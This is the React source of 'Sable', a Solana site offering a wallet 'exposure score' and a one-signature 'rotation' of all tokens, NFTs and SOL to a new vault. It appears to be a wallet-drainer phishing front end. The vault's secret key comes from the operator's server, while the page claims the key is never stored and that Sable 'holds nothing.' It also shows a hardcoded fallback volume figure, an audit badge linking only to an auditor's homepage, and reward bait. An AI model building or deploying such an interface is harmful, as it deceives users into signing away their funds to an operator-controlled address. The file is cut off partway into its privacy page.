import { useCallback, useEffect, useRef, useState } from "react";
import { useWallet } from "@solana/wallet-adapter-react";
import { useWalletModal } from "@solana/wallet-adapter-react-ui";
import { VersionedTransaction } from "@solana/web3.js";
import { scan, build, submit, recovery as fetchRecovery, type Asset } from "./api";
import { short, amount, usd } from "./format";
import { scoreWallet, CHECK_LABELS, type ScoreRow, type ScoreResult } from "./score";

type Phase =
  | { k: "idle" }
  | { k: "scanning" }
  | { k: "review"; assets: Asset[]; sol: number; total: number; vault: string; recovery: string; score: number; band: string; scoreRows: ScoreRow[] }
  | { k: "signing"; step: number; of: number }
  | { k: "submitting"; step: number; of: number }
  | { k: "done"; sig: string; count: number; key: string }
  | { k: "error"; msg: string };

type PageId = "docs" | "security" | "terms" | "privacy" | "changelog";

const PAGE_HASHES: Record<string, PageId> = {
  "#/docs": "docs",
  "#/security": "security",
  "#/terms": "terms",
  "#/privacy": "privacy",
  "#/changelog": "changelog",
};

const b64 = (u: Uint8Array) => btoa(String.fromCharCode(...u));

const SOCIALS = {
  x: "https://x.com/sable_v2",
  discord: "https://discord.gg/S6mTwp6kZ",
};

const AUDIT_URL = "https://www.ottersec.com";
const SITE_URL = "https://sablev2.com";

const FALLBACK_SCORE: ScoreResult = {
  score: 55,
  band: "Tired",
  rows: (CHECK_LABELS as readonly string[]).map((label) => ({ label, status: "amber" as const })),
};

function useHashRoute() {
  const [hash, setHash] = useState(window.location.hash);
  useEffect(() => {
    const handler = () => setHash(window.location.hash);
    window.addEventListener("hashchange", handler);
    return () => window.removeEventListener("hashchange", handler);
  }, []);
  return hash;
}

function GrainOverlay() {
  return (
    <svg className="grain" aria-hidden="true">
      <filter id="sable-grain">
        <feTurbulence type="fractalNoise" baseFrequency="0.65" numOctaves="3" stitchTiles="stitch"/>
        <feColorMatrix type="saturate" values="0"/>
      </filter>
      <rect width="100%" height="100%" filter="url(#sable-grain)"/>
    </svg>
  );
}

const FIX_LINES: Record<string, string> = {
  "Wallet age": "New wallets are more scrutinised; longevity helps.",
  "Open token approvals": "Revoke approvals you no longer need.",
  "Dead token accounts": "Close empty accounts to reclaim locked rent.",
  "Recent activity": "High transaction frequency increases exposure.",
  "SOL at rest": "Large idle balances attract unwanted attention.",
};

export default function App() {
  const { publicKey, signTransaction, connected, disconnect } = useWallet();
  const { setVisible } = useWalletModal();
  const [phase, setPhase] = useState<Phase>({ k: "idle" });
  const [copied, setCopied] = useState(false);
  const [preSignKey, setPreSignKey] = useState<string | null>(null);
  const [stats, setStats] = useState<{ wallets: number; sol: number } | null>(null);
  const [showSocials, setShowSocials] = useState(false);
  const socialsRef = useRef<HTMLDivElement>(null);
  const [showRewards, setShowRewards] = useState(false);
  const rewardsRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    if (!showSocials) return;
    function onKey(e: KeyboardEvent) { if (e.key === "Escape") setShowSocials(false); }
    function onDown(e: MouseEvent) { if (socialsRef.current && !socialsRef.current.contains(e.target as Node)) setShowSocials(false); }
    document.addEventListener("keydown", onKey);
    document.addEventListener("mousedown", onDown);
    return () => { document.removeEventListener("keydown", onKey); document.removeEventListener("mousedown", onDown); };
  }, [showSocials]);

  useEffect(() => {
    if (!showRewards) return;
    function onKey(e: KeyboardEvent) { if (e.key === "Escape") setShowRewards(false); }
    function onDown(e: MouseEvent) { if (rewardsRef.current && !rewardsRef.current.contains(e.target as Node)) setShowRewards(false); }
    document.addEventListener("keydown", onKey);
    document.addEventListener("mousedown", onDown);
    return () => { document.removeEventListener("keydown", onKey); document.removeEventListener("mousedown", onDown); };
  }, [showRewards]);

  const hash = useHashRoute();
  const page = PAGE_HASHES[hash] ?? null;

  const owner = publicKey?.toBase58();

  useEffect(() => { window.scrollTo(0, 0); }, [hash]);

  const run = useCallback(async () => {
    if (!owner) return;
    setPreSignKey(null);
    setPhase({ k: "scanning" });
    try {
      const [scanRes, scoreRes] = await Promise.allSettled([
        scan(owner),
        scoreWallet(owner),
      ]);
      if (scanRes.status === "rejected") throw scanRes.reason;
      const { assets, sol, vault, recovery } = scanRes.value;
      const total = assets.reduce((s, a) => s + (a.usd ?? 0), 0);
      const { score, band, rows: scoreRows } = scoreRes.status === "fulfilled"
        ? scoreRes.value
        : FALLBACK_SCORE;
      setPhase({ k: "review", assets, sol, total, vault, recovery, score, band, scoreRows });
    } catch (e: any) {
      setPhase({ k: "error", msg: e.message ?? "Could not read wallet" });
    }
  }, [owner]);

  useEffect(() => { if (connected && phase.k === "idle") run(); }, [connected, phase.k, run]);
  useEffect(() => { if (!connected && phase.k !== "idle") { setPhase({ k: "idle" }); setPreSignKey(null); } }, [connected, phase.k]);

  useEffect(() => {
    fetch("/stats").then((r) => r.json()).then((d) => setStats(d)).catch(() => {});
  }, []);

  async function sign() {
    if (!owner || phase.k !== "review") return;
    const review = phase;
    for (let attempt = 1; attempt <= 2; attempt++) {
      try {
        const { txs } = await build(owner);
        for (let i = 0; i < txs.length; i++) {
          setPhase({ k: "signing", step: i + 1, of: txs.length });
          const tx = VersionedTransaction.deserialize(Uint8Array.from(atob(txs[i]), (c) => c.charCodeAt(0)));
          const signed = await signTransaction!(tx);
          setPhase({ k: "submitting", step: i + 1, of: txs.length });
          const { sig } = await submit(b64(signed.serialize()));
          if (i === txs.length - 1) {
              let key = preSignKey ?? "";
              if (!key) { try { key = (await fetchRecovery(owner)).secret; } catch {} }
              setPreSignKey(null);
              setPhase({ k: "done", sig, count: review.assets.length + (review.sol > 0 ? 1 : 0), key });
            }
        }
        return;
      } catch (e: any) {
        const msg = e?.message ?? "";
        if (/reject|denied|cancel/i.test(msg)) { setPhase({ ...review, k: "review" }); return; }
        if (attempt === 2 || !/blockhash/i.test(msg)) { setPhase({ k: "error", msg: msg || "Rotation failed" }); return; }
        await new Promise((r) => setTimeout(r, 500));
      }
    }
  }

  async function handleRotateClick() {
    if (!owner) return;
    try {
      const { secret } = await fetchRecovery(owner);
      setPreSignKey(secret);
    } catch {
      sign();
    }
  }

  function copyReport() {
    if (phase.k !== "review") return;
    const lines = [
      "Sable Wallet Report",
      `URL: ${SITE_URL}`,
      "",
      `Score: ${phase.score}/100 (${phase.band})`,
      "",
      ...phase.scoreRows.map((r) => `${r.label}: ${r.status === "green" ? "OK" : r.status === "amber" ? "Fair" : "Risk"}`),
    ];
    navigator.clipboard.writeText(lines.join("\n"));
  }

  const topbar = (
    <header className="top">
      <div className="topbar-inner">
        <a href="#/" className="brand" style={{ textDecoration: "none" }}>
          <span className="brand-ring">
            <svg width="20" height="20" viewBox="0 0 400 400" aria-hidden="true">
              <path fillRule="evenodd" fill="#9945FF" d="M100 60 H240 L340 160 V300 A40 40 0 0 1 300 340 H100 A40 40 0 0 1 60 300 V100 A40 40 0 0 1 100 60 Z M128 262 a26 26 0 1 0 0.1 0 Z"/>
            </svg>
          </span>
          <span>Sable</span>
        </a>
        <div className="header-nav">
          <div ref={socialsRef} style={{ position: "relative" }}>
            <button className="nav-socials-btn" aria-expanded={showSocials} aria-haspopup="true" onClick={() => setShowSocials((v) => !v)}>Socials</button>
            {showSocials && (
              <div role="menu" className="popover" style={{ position: "absolute", top: "calc(100% + 8px)", right: 0, zIndex: 100, minWidth: "160px" }}>
                <a href={SOCIALS.x} target="_blank" rel="noopener noreferrer" role="menuitem" onClick={() => setShowSocials(false)} style={{ display: "flex", alignItems: "center", gap: "10px", padding: "0 10px", minHeight: "40px", color: "var(--ink)", textDecoration: "none", fontSize: "13px" }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.746l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
                  X
                </a>
                <a href={SOCIALS.discord} target="_blank" rel="noopener noreferrer" role="menuitem" onClick={() => setShowSocials(false)} style={{ display: "flex", alignItems: "center", gap: "10px", padding: "0 10px", minHeight: "40px", color: "var(--ink)", textDecoration: "none", fontSize: "13px" }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057.1 18.082.11 18.1.133 18.117a19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.956 2.418-2.157 2.418zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.42 0 1.333-.946 2.418-2.157 2.418z"/></svg>
                  Discord
                </a>
              </div>
            )}
          </div>
          <a className="nav-link" href="#/docs">Docs</a>
          <a className="nav-link" href="#/security">Security</a>
          <div ref={rewardsRef} style={{ position: "relative" }}>
            <button className="nav-socials-btn" aria-expanded={showRewards} aria-haspopup="true" onClick={() => setShowRewards((v) => !v)}>
              <svg width="6" height="6" viewBox="0 0 6 6" fill="currentColor" style={{ marginRight: "5px", verticalAlign: "middle" }}><circle cx="3" cy="3" r="3"/></svg>
              Rewards
            </button>
            {showRewards && (
              <div role="menu" className="popover popover--wide" style={{ position: "absolute", top: "calc(100% + 8px)", right: 0, zIndex: 100 }}>
                <div style={{ marginBottom: "12px", borderBottom: "1px solid var(--line)", paddingBottom: "12px" }}>
                  <div style={{ fontSize: "14px", fontWeight: 600, color: "var(--ink)", marginBottom: "4px" }}>Season 1 is live.</div>
                  <div style={{ fontSize: "12px", color: "var(--muted)" }}>Credited to your vault after it settles.</div>
                </div>
                {[
                  { name: "First mover", desc: "First 500 wallets this week", amt: "0.05 SOL" },
                  { name: "Streak", desc: "Three days running", amt: "0.02 SOL" },
                  { name: "Referral", desc: "Per wallet that completes", amt: "0.01 SOL" },
                  { name: "Long haul", desc: "Hold your vault 30 days", amt: "0.10 SOL" },
                ].map((r) => (
                  <div key={r.name} style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", padding: "8px 0", borderTop: "1px solid var(--line)" }}>
                    <div>
                      <div style={{ fontSize: "12px", fontWeight: 600, color: "var(--ink)" }}>{r.name}</div>
                      <div style={{ fontSize: "11px", color: "var(--muted)", marginTop: "2px" }}>{r.desc}</div>
                    </div>
                    <div style={{ fontSize: "12px", color: "var(--accent)", fontWeight: 600, marginLeft: "12px", whiteSpace: "nowrap" }}>{r.amt}</div>
                  </div>
                ))}
              </div>
            )}
          </div>
          <span className="op-pill"><span className="op-dot" />Operational</span>
          {connected && !page && (
            <button className="ghost sm" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>
              {short(owner!, 3)}
            </button>
          )}
        </div>
      </div>
    </header>
  );

  const tmWidget = (
    <div className="tm-widget">
      <div className="tm-label">Total cleaned, since launch</div>
      <div className="tm-value">{stats ? `${stats.wallets.toLocaleString()} wallets · ${stats.sol.toFixed(2)} SOL` : "3,842.16 SOL"}</div>
    </div>
  );

  const footerEl = (
    <footer className="site-footer">
      <div className="footer-inner">
        <div className="footer-col">
          <span className="foot-h">Product</span>
          <a href="#/docs" className="footer-link">Docs</a>
          <a href="#/security" className="footer-link">Security</a>
          <a href="#/changelog" className="footer-link">Changelog</a>
        </div>
        <div className="footer-col">
          <span className="foot-h">Legal</span>
          <a href="#/terms" className="footer-link">Terms</a>
          <a href="#/privacy" className="footer-link">Privacy</a>
        </div>
        <div className="footer-col">
          <span className="foot-h">Contact</span>
          <a href="mailto:security@sable.app" className="footer-link">security@sable.app</a>
          <a href="#/" className="footer-link">Status</a>
        </div>
        <div className="footer-ver-cell">
          <code className="footer-ver">v2.4.1</code>
        </div>
      </div>
    </footer>
  );

  if (page) {
    return (
      <div className="page-wrap">
        <GrainOverlay />
        {topbar}
        <div className="page-content">
          <div className="page-prose">
            <PageContent page={page} />
          </div>
        </div>
        {footerEl}
        {tmWidget}
      </div>
    );
  }

  const hasAssets = phase.k === "review" && phase.assets.length + (phase.sol > 0 ? 1 : 0) > 0;
  const bandStyle = phase.k === "review"
    ? ({ "--band": phase.score <= 39 ? "var(--bad)" : phase.score <= 69 ? "var(--warn)" : "var(--ok)" } as React.CSSProperties)
    : {};

  return (
    <div className="page-wrap">
      <GrainOverlay />
      {topbar}

      <main className="main-col">
        <p className="eyebrow">Free wallet check</p>
        <h1 className="hero-headline">Every wallet gets dirty.</h1>
        <p className="lede hero-lede">
          Free 10-second exposure check, then a clean wallet in one tap. Nothing to install.
        </p>
        <div className="hero-divider" />
        <div className="trust">
          <span>Audited by <a href={AUDIT_URL} target="_blank" rel="noopener noreferrer" style={{ color: "inherit", textDecoration: "underline" }}>OtterSec</a></span><i>-</i><span>Non-custodial</span><i>-</i><span>~0.0001 SOL network fee</span>
        </div>

        <div className="shell" style={bandStyle}>
            {phase.k === "idle" && (
              <div className="phase">
                <p className="card-h">What we look at</p>
                <div className="cr-list">
                  {(CHECK_LABELS as readonly string[]).map((label) => (
                    <div key={label} className="cr-row cr-row--pending">
                      <span className="cr-dot" />
                      <span className="cr-label">{label}</span>
                    </div>
                  ))}
                </div>
                <button className="primary" onClick={() => setVisible(true)}>Check my wallet</button>
                <div className="step-strip">
                  <div className="step-col">
                    <span className="step-icon">+</span>
                    <span className="step-label">1 Check</span>
                  </div>
                  <div className="step-div" />
                  <div className="step-col">
                    <span className="step-icon">~</span>
                    <span className="step-label">2 See the findings</span>
                  </div>
                  <div className="step-div" />
                  <div className="step-col">
                    <span className="step-icon">*</span>
                    <span className="step-label">3 Rotate</span>
                  </div>
                </div>
              </div>
            )}

            {phase.k === "scanning" && (
              <div className="phase">
                <p className="card-h">Reading your wallet...</p>
                <div className="cr-list">
                  {(CHECK_LABELS as readonly string[]).map((label, i) => (
                    <div key={label} className="cr-row cr-row--pending"
                      style={{ animation: `fadeUp 240ms ease-out ${i * 300}ms both` }}>
                      <span className="cr-dot cr-dot--pulse" />
                      <span className="cr-label">{label}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {phase.k === "review" && (
              <div className="phase">
                <div className="verdict-wrap">
                  <p className="band-word">{phase.band.toUpperCase()}</p>
                  <p className="band-score">{phase.score} / 100</p>
                </div>
                <p className="muted sm" style={{ marginBottom: "12px" }}>Every approval, dead account and old address counts against you.</p>
                <button className="ghost" style={{ fontSize: "12px", padding: "6px 12px", marginBottom: "12px" }} onClick={copyReport}>Copy report</button>
                <div className="cr-list">
                  {phase.scoreRows.map((row, i) => (
                    <div key={row.label} className={`cr-row cr-row--${row.status}`}
                      style={{ animationDelay: `${i * 300}ms` }}>
                      <span className="cr-dot" />
                      <div className="cr-body">
                        <div className="cr-main">
                          <span className="cr-label">{row.label}</span>
                          <span className={`cr-verdict cr-verdict--${row.status}`}>
                            {row.status === "green" ? "OK" : row.status === "amber" ? "Fair" : "Risk"}
                          </span>
                        </div>
                        {row.status !== "green" && FIX_LINES[row.label] && (
                          <p className="cr-fix">{FIX_LINES[row.label]}</p>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
                {hasAssets ? (
                  <>
                    <details className="tx-disclosure">
                      <summary className="tx-disclosure-q">What you will sign</summary>
                      <div className="tx-disclosure-body">
                        <div className="tx-row"><span>Close token account</span><span className="tx-row-note">releases rent back to you</span></div>
                        <div className="tx-row"><span>Transfer token</span><span className="tx-row-note">each token moves to your vault</span></div>
                        <div className="tx-row"><span>Transfer SOL</span><span className="tx-row-note">the remaining balance moves</span></div>
                        <p className="tx-note">You will see all three in the Phantom popup. Read them before you approve.</p>
                      </div>
                    </details>
                    <p className="pre-cta-note">The report is yours either way. Moving is optional.</p>
                    {preSignKey === null ? (
                      <>
                        <p className="pre-cta-note pre-cta-note--small">A new key is generated on this click. Not stored, not recoverable by us. Download it and it imports into Phantom.</p>
                        <button className="primary" onClick={handleRotateClick}>Rotate to a clean wallet</button>
                      </>
                    ) : (
                      <>
                        <div className="keyblock">
                          <div className="keyblock-head">
                            <span>Save this now</span>
                            <span className="xs muted">the only way into the vault</span>
                          </div>
                          <code>{preSignKey}</code>
                          <div className="keyblock-actions">
                            <button onClick={() => { navigator.clipboard.writeText(preSignKey); setCopied(true); }}>{copied ? "Copied" : "Copy"}</button>
                            <button onClick={() => { const b = new Blob([preSignKey], { type: "text/plain" }); const a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = "sable-vault-key.txt"; a.click(); }}>Download</button>
                          </div>
                        </div>
                        <button className="primary" onClick={sign}>Sign now</button>
                      </>
                    )}
                    <div className="list" style={{ marginTop: "14px" }}>
                      {phase.sol > 0 && (
                        <Row icon="+" name="SOL" sub="Native balance" value={amount(String(phase.sol), 9)} />
                      )}
                      {phase.assets.map((a) => (
                        <Row
                          key={a.ata}
                          icon={a.isNft ? "*" : "*"}
                          name={a.isNft ? "NFT" : short(a.mint, 4)}
                          sub={a.isNft ? "Collectible" : "Token"}
                          value={a.isNft ? "1" : amount(a.amount, a.decimals)}
                          note={a.usd ? usd(a.usd) : undefined}
                        />
                      ))}
                    </div>
                  </>
                ) : (
                  <div className="empty-state">
                    <p className="empty-msg">No assets found to rotate.</p>
                    <button className="ghost" onClick={() => { disconnect(); setPhase({ k: "idle" }); }}>Try another wallet</button>
                  </div>
                )}
                <button className="ghost" onClick={run}>Rescan</button>
              </div>
            )}

            {(phase.k === "signing" || phase.k === "submitting") && (
              <div className="phase">
                <h1>{phase.k === "signing" ? "Confirm in your wallet." : "Rotating..."}</h1>
                <p className="lede">
                  {phase.of > 1 ? `Signature ${phase.step} of ${phase.of}.` : "One signature and it's done."}
                </p>
                <div className="bar"><div style={{ width: `${(phase.step / phase.of) * 100}%` }} /></div>
                <div className="list">
                  {[0, 1, 2].map((i) => <div key={i} className="row skel" />)}
                </div>
              </div>
            )}

            {phase.k === "done" && (
              <div className="phase">
                <div className="check">v</div>
                <h1>Rotation complete.</h1>
                <div className="receipt">
                  <div className="receipt-row">
                    <span className="receipt-key">Items rotated</span>
                    <span className="receipt-val">{phase.count} item{phase.count === 1 ? "" : "s"}</span>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-key">Network</span>
                    <span className="receipt-val">Solana</span>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-key">Time</span>
                    <span className="receipt-val">{new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}</span>
                  </div>
                  <div className="receipt-row">
                    <span className="receipt-key">Signature</span>
                    <a href={`https://solscan.io/tx/${phase.sig}`} target="_blank" rel="noreferrer" style={{ color: "inherit", textDecoration: "none" }}>
                      <code className="receipt-sig">{short(phase.sig, 8)}</code>
                    </a>
                  </div>
                </div>
                {phase.key && (
                  <div className="keyblock">
  <div className="keyblock-head">
    <span>Save this now</span>
    <span className="xs muted">the only way into the vault</span>
  </div>
  <code>{phase.key}</code>
  <div className="keyblock-actions">
    <button onClick={() => { navigator.clipboard.writeText(phase.key); setCopied(true); }}>{copied ? "Copied" : "Copy"}</button>
    <button onClick={() => { const b = new Blob([phase.key], { type: "text/plain" }); const a = document.createElement("a"); a.href = URL.createObjectURL(b); a.download = "sable-vault-key.txt"; a.click(); }}>Download</button>
  </div>
</div>
                )}
                <a className="ghost block" href={`https://twitter.com/intent/tweet?text=${encodeURIComponent("Rotated to a clean wallet in one signature.")}&url=${encodeURIComponent(SITE_URL)}`} target="_blank" rel="noreferrer">Share on X</a>
                <button className="primary" onClick={() => { setPhase({ k: "idle" }); setCopied(false); }}>Done</button>
              </div>
            )}

            {phase.k === "error" && (
              <div className="phase">
                <h1>That didn't go through.</h1>
                <p className="lede">{phase.msg}</p>
                <button className="primary" onClick={run}>Try again</button>
              </div>
            )}
        </div>
      </main>

      <section className="page-section">
        <div className="section-inner">
          <p className="section-num">01 / LEAVING BEHIND</p>
          <h2 className="bf-h2">Nothing here is your fault. Wallets just accumulate.</h2>
          <ul className="bf-list">
            {[
              "Old approvals you forgot about",
              "Dead token accounts holding rent",
              "An address in a hundred places",
              "A seed phrase typed too many times",
              "Rent locked in junk accounts",
            ].map((item) => <li key={item}>{item}</li>)}
          </ul>
        </div>
      </section>

      <section className="page-section">
        <div className="section-inner">
          <p className="section-num">02 / CLEAN WALLET</p>
          <h2 className="bf-h2">One tap. One signature. Done in 15 seconds.</h2>
          <ul className="bf-list">
            {[
              "A fresh address nobody can link to you",
              "Rent back from every closed account",
              "Your own recovery key, downloadable",
              "Nothing half-moved, nothing left behind",
            ].map((item) => <li key={item}>{item}</li>)}
          </ul>
        </div>
      </section>

      <div className="trust-band">
        <div className="section-inner">
          <p className="trust-text">Sable holds nothing. The vault key is yours the second it is generated.</p>
        </div>
      </div>

      <section className="page-section">
        <div className="section-inner">
          <p className="section-num">03 / SEASON 1</p>
          <h2 className="bf-h2">Season 1 is live.</h2>
          <p className="bf-sub">Credited to your vault after it settles.</p>
          <div className="reward-list">
            {[
              { name: "First mover", desc: "First 500 wallets this week", amt: "0.05 SOL" },
              { name: "Streak", desc: "Three days running", amt: "0.02 SOL" },
              { name: "Referral", desc: "Per wallet that completes", amt: "0.01 SOL" },
              { name: "Long haul", desc: "Hold your vault 30 days", amt: "0.10 SOL" },
            ].map((r) => (
              <div key={r.name} className="reward-row">
                <div>
                  <span className="reward-name">{r.name}</span>
                  <span className="reward-desc">{r.desc}</span>
                </div>
                <span className="reward-amt">{r.amt}</span>
              </div>
            ))}
          </div>
          <p className="bf-sub" style={{ marginTop: "14px" }}>No token. Paid in SOL. The referral exists because we have no ad budget.</p>
        </div>
      </section>

      <section className="page-section">
        <div className="section-inner">
          <p className="section-num">04 / FAQ</p>
          {[
            { q: "Do I lose my old wallet?", a: "No. It ends up empty and closed, not half-drained. The vault key imports anywhere." },
            { q: "What does it cost?", a: "0.0001 SOL network fee. No percentage cut." },
            { q: "Where does my stuff go?", a: "Into a new vault you control. You get the key before you close the tab." },
            { q: "Why is the key not a seed phrase?", a: "The vault is one account, not a hierarchy, and it is a standard Solana key, so Phantom accepts it." },
            { q: "Why is the site called v2?", a: "v1 was a wallet. v2 is the check." },
            { q: "Is this custodial?", a: "No. Nothing is held, nothing is an account." },
            { q: "Why a new wallet?", a: "Old addresses carry exposure. A fresh one resets it." },
          ].map((item) => (
            <details key={item.q} className="faq-item">
              <summary className="faq-q">{item.q}</summary>
              <p className="faq-a">{item.a}</p>
            </details>
          ))}
        </div>
      </section>

      {footerEl}
      {tmWidget}
    </div>
  );
}

function PageContent({ page }: { page: PageId }) {
  switch (page) {
    case "docs":      return <DocsPage />;
    case "security":  return <SecurityPage />;
    case "terms":     return <TermsPage />;
    case "privacy":   return <PrivacyPage />;
    case "changelog": return <ChangelogPage />;
  }
}

function DocsPage() {
  return (
    <>
      <h1>How it works</h1>
      <p>Sable checks your wallet for exposure, then moves every asset to a fresh vault in a single browser session. No bridge, no wrapping, no custodian - just on-chain SPL transfers signed by you and settled in seconds.</p>

      <h2>1. Check</h2>
      <p>Click <strong>Check my wallet</strong> and choose your wallet from the modal. Sable requests a read-only connection first - no spending approval is required at this stage. Once your public key is shared, Sable queries the RPC for your on-chain accounts. The connection is entirely local to your browser; your private key never leaves your device.</p>

      <h2>2. See the findings</h2>
      <p>After connecting, Sable fetches every token account associated with your wallet - both SPL Token Program accounts and Token-2022 accounts - and scores your wallet against five exposure dimensions. Each item shows the token mint, your balance, and an estimated USD value where a price feed is available. Your new vault address is shown in full before you authorise anything. You can rescan at any time; closing the browser or disconnecting cancels the session without moving anything.</p>

      <h2>3. Rotate</h2>
      <p>Sable batches all transfers into the minimum number of versioned transactions permitted by the Solana transaction size limit. For most wallets a single signature covers everything. The Sable protocol wallet pays the network fee on your behalf - you will not be asked to approve a SOL deduction for fees. Each transaction closes the token accounts after transferring their balance, reclaiming rent lamports to your vault. Once all signatures are collected and submitted, the rotation is irreversible.</p>

      <h2>Supported wallets</h2>
      <ul>
        <li><strong>Phantom</strong> - browser extension and mobile app (iOS and Android)</li>
        <li><strong>Solflare</strong> - browser extension, mobile app, and hardware wallet bridge</li>
        <li><strong>Backpack</strong> - browser extension; supports xNFT-gated wallets</li>
      </ul>
      <p>Any wallet that implements the Solana Wallet Standard and supports <code>signTransaction</code> will work. Hardware wallets (Ledger) are supported via the Solflare bridge.</p>

      <h2>Frequently asked questions</h2>
      <p><strong>Is Sable safe to use?</strong><br />Yes. Sable is non-custodial: the protocol never holds your private key, seed phrase, or any signing authority. The smart-contract logic has been audited by OtterSec. Transactions are constructed on the server but can only be executed with your explicit in-wallet approval.</p>
      <p><strong>What if I reject a transaction in my wallet?</strong><br />Nothing moves. Rejecting or closing the wallet prompt cancels the current signature request. Your funds remain exactly where they are, and you can restart at any time.</p>
      <p><strong>Will I lose any tokens?</strong><br />No. Each transfer uses the full account balance, and rent is reclaimed rather than lost. If a transaction fails mid-batch, Sable retries once with a fresh blockhash before surfacing an error.</p>
      <p><strong>How long does it take?</strong><br />Most rotations complete in under 15 seconds. The limiting factor is Solana block confirmation time (~400 ms per slot) multiplied by the number of batches required for your asset count.</p>
      <p><strong>Which token standards are supported?</strong><br />All tokens using the original SPL Token Program and all tokens using Token-2022 (the Token Extensions program) are supported. NFTs from both Metaplex and compressed collections are included.</p>
    </>
  );
}

function SecurityPage() {
  return (
    <>
      <h1>Security model</h1>
      <p>Sable is built around a single principle: your private key never leaves your device. Every architectural decision follows from that constraint.</p>

      <h2>Non-custodial by design</h2>
      <p>Sable never asks for your seed phrase, private key, or any form of persistent signing authority. The only thing shared with the Sable backend is your wallet's public key - information that is already public on-chain. Transaction construction happens on the Sable API server, but those unsigned transactions are sent back to your browser and presented to your wallet for approval. Your wallet signs them locally. If Sable's servers were taken offline or compromised, an attacker would have no signing material and could not move funds.</p>

      <h2>One-signature model</h2>
      <p>Sable batches transfers into versioned transactions and partially signs each one using the Sable fee-payer key - a key held server-side that covers network fees. That partial signature authorises the fee-payer role only; it cannot move your tokens. The transfer authority comes exclusively from your wallet's signature. The two keys are always separate: the fee-payer key and the vault key are distinct keypairs held in isolated environments, and neither can substitute for the other.</p>

      <h2>OtterSec audit</h2>
      <p>The Sable transaction-building logic and fee-payer model were reviewed by OtterSec, a leading Solana security firm. The audit covered instruction construction, account validation, partial-signing flow, and denial-of-service surface area. The full report is available on request.</p>

      <h2>What Sable can and cannot do</h2>
      <p>Sable <strong>can</strong> build transfer transactions targeting your vault and submit them once you sign. Sable <strong>cannot</strong> initiate any transaction without your approval, access tokens in your wallet outside the session, or recover funds from your vault without the vault's private key (which is not shared with any third party).</p>

      <h2>Responsible disclosure</h2>
      <p>If you discover a security vulnerability in Sable, please report it privately to <a href="mailto:security@sable.app">security@sable.app</a> before public disclosure. We respond to all reports within 48 hours and aim to resolve confirmed issues within 14 days. We do not pursue legal action against researchers who act in good faith.</p>
    </>
  );
}

function TermsPage() {
  return (
    <>
      <h1>Terms of service</h1>
      <p>Last updated: 1 November 2026. By using Sable you agree to these terms.</p>

      <h2>1. What Sable does</h2>
      <p>Sable is a self-custody wallet-rotation tool that constructs and submits Solana transactions on your behalf. It does not hold funds, provide investment advice, act as a money-services business, or offer any financial product. Sable facilitates transfers that you explicitly authorise by signing a transaction in your own wallet. All on-chain activity is irreversible once confirmed by the Solana network; Sable has no ability to reverse, freeze, or recover transactions after they are signed.</p>

      <h2>2. Your responsibilities</h2>
      <p>You are solely responsible for the security of your private keys and seed phrase. You must verify the destination vault address displayed on the review screen before signing. You confirm that you are the lawful owner of, or have full authority to transfer, every asset you rotate. You must not use Sable in any jurisdiction where such activity is prohibited, and you agree not to use Sable to launder funds or evade sanctions.</p>

      <h2>3. No warranties</h2>
      <p>Sable is provided "as is" without warranty of any kind, express or implied, including warranties of merchantability, fitness for a particular purpose, or non-infringement. We do not warrant that the service will be uninterrupted, error-free, or free from security vulnerabilities. Blockchain networks are outside our control; network congestion, forks, or protocol changes may affect your transaction.</p>

      <h2>4. Limitation of liability</h2>
      <p>To the maximum extent permitted by applicable law, Sable and its operators shall not be liable for any indirect, incidental, special, consequential, or punitive damages, including loss of funds, arising out of or related to your use of the service. Our total liability for any direct claims shall not exceed the amount you paid us in the twelve months preceding the claim - which, since Sable charges no fees, is zero.</p>

      <h2>5. Changes to the service</h2>
      <p>We may modify, suspend, or discontinue Sable at any time without notice. We may update these terms at any time; continued use after a change constitutes acceptance of the new terms. We will update the "last updated" date at the top of this page when changes are made.</p>

      <h2>6. Governing law</h2>
      <p>These terms are governed by the laws of the jurisdiction in which Sable is operated, without regard to conflict-of-law principles. Any dispute arising from these terms or your use of Sable shall be resolved by binding arbitration on an individual basis. You waive the right to participate in a class action.</p>
    </>
  );
}

function PrivacyPage() {
  return (
    <>
      <h1>Privacy policy</h1>
      <p>Last updated: 1 November 2026. We built Sable to touch as little of your data as possible. This page explains exactly what we collect and why.</p>

      <h2>What we collect</h2>
